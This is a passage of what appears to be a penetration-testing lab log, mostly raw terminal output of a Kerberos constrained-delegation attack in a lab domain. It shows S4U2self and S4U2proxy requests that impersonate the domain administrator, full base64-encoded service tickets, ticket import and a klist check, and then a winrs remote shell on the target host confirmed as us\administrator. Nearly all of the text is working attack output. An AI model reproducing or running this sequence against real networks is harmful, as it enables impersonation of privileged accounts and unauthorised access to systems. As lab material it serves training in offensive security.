      HyBH+yKl5fHf4NHRy1j9xWoErDKTqjE9RR0oIBV4VXMctFrYg+baChQ8v6S0AscQJEae7jH6PhoPJ3dC
      f4HfbWmdvH91z9S6di4l78a9RNpV5eHKPQCqBKdnkhBMOMeRMfpvE+eGpqXa78Lq8+NKq/GKoknegETM
      fyuliU5IUr5IAKNiClQGboHvx7jQROcltuv2YFepwZ8sh7Q7D/in0+DhD8mEZ92A2QgZSPzLeDFav1ny
      zXrCM6zZuqlydIrUC0spLb6LFW0Ctfwfd3LdOJhQomauFuUpAhkLfCVs610P4qDUOcQBkkOgcg5JBKHX
      rK66raApC4mDdLkMajgrmYzPPl2LErULP0tj0pgr0E2RqpCkCtflDf3OyD8/z+IyfWhuwgSc3ji9z9eP
      piqUwMQJudP5z1p8QOLYmLMfUMzXR94RQNcrm7Hi4qCUsgsUn6w5ZTmQB3OiYqxAi4SYHv1QU4Kd74aA
      Vtw84nUlN8THOuLu4wSAUzIp8hO1uVkRPE0gIB+kqCnJ/FcLEGmAEjSQfnZUVfrIuTPvj56ZxPdFzsQ6
      wGbKXJM7yAsQgHJee9Pejb0waMyrHhEoprIBGvZoGB9aQXp5tUuOz5p2tzdCXHoW7gf7FBSPf9tasz3A
      KnZCtHzLsZ7nD74uzD6FQ3DJOJG0j4FsfrPfk7hibRgjuL76JO3TzUl2gdn1cHFtVzMGppO25D/cgVDv
      F0l8AO3WdTYJ4MPF4fTxwFYxbZq41HCuX/eY2LACB+YzMUbog+AiMOiPh34q3kHVZS/w0vBvJiQItgWI
      Ud0twM7KCBU4G50GvDTTeGLLo6HqUj95spo7T3X1RtNSZ/iE2Qxyi2hzFa3EYtUFRICroaw64wpBZUNE
      7qClW79HzgkX3ctZHay3WbHXRZRNy0i1z2TrwJ8r3Rm8Kmmcb7cj4B6kpyIeO5p4R4Q+DX6wwhXQlplt
      90/SzJIm0HHsjmpVW6BJcgDIeRkBEhhKcEx8hBDFevMV3G6wSG6+b3vDdPJePZqPLYwpbnyutq4RnkB4
      FAa1JIdiWPDrNKy0IbllydiaZAXirIOO+LVVcV5hqwWL+jOKBuTvwfHaDkniDLt81AdU1E8hGFs6EYCN
      rwkaOk9sp4aiInAbEJBwX9mEQQlTakwctUHEDhlVXzo1kZrpHN3vgedy7+StAGAbX5Ph9PmxRNh6mOtE
      j1lk0HcYMOkykAlqwJDC4nicStQBS9rF6Wc0Z1J4lW2ZgMggqCuRWaeHp7/hUBrnhgKVahqtvKSz7+dF
      TVEu1+RLGqHWv5EbxC6dlWaOdAWFufdpTW4jVd8iwlRxRMF+uxSDwKBMyLp3GJLx7iI7yFNYxpMSf9H4
      eiUTDTeuIMX0hWYTIdVvTeGDeJwoBO0SXvus8p5EhDf8MdS+MrOjgfcwgfSgAwIBAKKB7ASB6X2B5jCB
      46CB4DCB3TCB2qArMCmgAwIBEqEiBCBSjx+zzlOMy5Q8KT8xf7C92KeFAqOhfBLMl2hDQmE8TaETGxFV
      Uy5URUNIQ09SUC5MT0NBTKIXMBWgAwIBAaEOMAwbCnN0dWRlbnQxNySjBwMFAEDhAAClERgPMjAyMzAy
      MjAxOTU3MThaphEYDzIwMjMwMjIxMDU1NzE4WqcRGA8yMDIzMDIyNzE5NTcxOFqoExsRVVMuVEVDSENP
      UlAuTE9DQUypJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEXVzLnRlY2hjb3JwLmxvY2Fs


[*] Action: S4U

[*] Building S4U2self request for: 'student17$@US.TECHCORP.LOCAL'
[*] Using domain controller: US-DC.us.techcorp.local (192.168.1.2)
[*] Sending S4U2self request to 192.168.1.2:88
[+] S4U2self success!
[*] Got a TGS for 'administrator' to 'student17$@US.TECHCORP.LOCAL'
[*] base64(ticket.kirbi):

      doIGBDCCBgCgAwIBBaEDAgEWooIFBDCCBQBhggT8MIIE+KADAgEFoRMbEVVTLlRFQ0hDT1JQLkxPQ0FM
      ohcwFaADAgEBoQ4wDBsKc3R1ZGVudDE3JKOCBMEwggS9oAMCARKhAwIBAaKCBK8EggSrxwLQ98jwsuAq
      pwWau0LiO/BOT3Emio0jhPV2UIPnAWwE4iZygCYLHyWiW1qHNX989UIX+v7kNrig/w4KX8VD0KSEf+kl
      fkPYIfcNpidrJMd8Kh0J63SphghfRrsF5P/Ev/wDIaTLjkurb55MSK/NiV3Lt4DACT7Q8BlrwVc3gzph
      WN/WvjwquOSLLSQ3OJODJLOvXndFqqrOFNtopcv5V3OoncfnqoMhXSjFqG2FZT8w0RWBZQ5ho/xx3ZYZ
      N6cGsIe7MDCxQgQlKCfEQMSOuji5fxotjz6l/wua/N1Bhw/tf4Qwp0rJ8ONUCzeQBu0lDF9d8jaNDbDO
      Th0maw8Ta7Hc7VQxvTvg+y5pYoG6t0aDLM6Gy6KqOhsdkSQo02yKWcfK7CGYYCY9Yo2d/UjitdMEsDfh
      HJyS957SuOJUWDcGi8bSEh6hq4JWByB2tjQX/1jWBpHWvLQejitTh2MV/drCjTMnsbubv7hU0vqTM0ai
      zCsdGRY9Tjbhip7vVIfmiYEQRPLZEq0dM68kijQlcXEEMt4qz2/lEp2XzAYXXsXRu+ocEFtZDViYgydV
      T0Wmno25nBP5mm+7dezPEMws0PKlRwviAXfGgw8cXdrOIB9f88UxiQrHF4ERMvPx/a00LPYNP6dHg9fn
      AvjnhDyFSIvTCTSDGNUyZpGdB6vucoTPL31qQts6sotUOt6H0QIeujK2dOX1kXhmGuIN+vhJg6rQMl9b
      SyStNpgspHFedpMEyIAiN4Q63/6OUYgv84rAxcDyQ66pSYfT0qmGIStWv2KC2MNhfcU3nclxQy4yzVXA
      NNdYej/W19UxIcneKZ0NhHYK+tM+Fn3JRpNrpxTcfffAf5Hqy+5EKh0qxq3ojsYI66TKBLYnqWw8Rqt+
      mysF/B2H5FXvOSg0RdQoBi2Obj0q9E7Y+bk1SntMIt2E500L8Z2+xVQS2CAt7rADmG+q15VUuEJQyDEQ
      VjOcsNn7u4lChkhiw3H2Xo96INJHiR6yIH1aePrJdRaLhVXLgvWiNmA/vaniHRDjMQHlbM2tvVfiuf0c
      Lvb0pKe9V2/4OyKN5lZZcKGJsu4XMGIQlbBiibyOAOwtAGXFb0EcymYuRF6gYABEZdVw0x7e7C2VWZfe
      HorxII4pqdst4Q1rOpI0orJHDzDLyFuPShz0rb+EP/4X1JeXb6ES1JROaNJwrpAbQjPtlH3Nz3FqBfJN
      EjKQN2nX8/+6miqSbz1XMMjUGNw0jQswoeqLk5McqXwyLXDITRNltb6i5SwsAGUd/bgadJFhhLmJwQsu
      hiZREkzqRhYSijPsJrr8tUFtOoO3y0N5FhfebbnUoozFlexVB99XNcpv+O9plbm7Lv12SM1gzLs2cB04
      u6OOqDXBLGGXKZefyg+nhyK3oOd611yej3872ucNxUInPrDKuEceEZAqC8GbGg01sQq5C+UhBFkzOmfj
      nj2URmID8OXxYD/3moK0dkYWxVZWQ9F//BH2LrCMcyML6+MywDvklwdu2KH/BcemB39jz5oM2VNSd3ad
      PnJh/mxLC6GUuDsjjBV5ohzG9fktYCSWAKNU0S8SM7dMn/LHcxQ+wKBW8wzV7KOB6zCB6KADAgEAooHg
      BIHdfYHaMIHXoIHUMIHRMIHOoCswKaADAgESoSIEIMb/wXG+Pvu+cASFLR+WXVZuJvrIokhHrLR4EVKL
      HkOUoRMbEVVTLlRFQ0hDT1JQLkxPQ0FMohowGKADAgEKoREwDxsNYWRtaW5pc3RyYXRvcqMHAwUAQKEA
      AKURGA8yMDIzMDIyMDE5NTcxOFqmERgPMjAyMzAyMjEwNTU3MThapxEYDzIwMjMwMjI3MTk1NzE4WqgT
      GxFVUy5URUNIQ09SUC5MT0NBTKkXMBWgAwIBAaEOMAwbCnN0dWRlbnQxNyQ=

[*] Impersonating user 'administrator' to target SPN 'http/us-helpdesk'
[*] Building S4U2proxy request for service: 'http/us-helpdesk'
[*] Using domain controller: US-DC.us.techcorp.local (192.168.1.2)
[*] Sending S4U2proxy request to domain controller 192.168.1.2:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'http/us-helpdesk':

      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
      FTATGwRodHRwGwt1cy1oZWxwZGVzaw==
[+] Ticket successfully imported!

C:\Windows\system32>klist

Current LogonId is 0:0x184bfdc

Cached Tickets: (1)

#0>     Client: administrator @ US.TECHCORP.LOCAL
        Server: http/us-helpdesk @ US.TECHCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 2/20/2023 11:57:18 (local)
        End Time:   2/20/2023 21:57:18 (local)
        Renew Time: 2/27/2023 11:57:18 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:

C:\Windows\system32>winrs -r:us-helpdesk cmd
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator.US>hostname
hostname
US-HelpDesk

C:\Users\Administrator.US>whoami
whoami
us\administrator

C:\Users\Administrator.US>
```
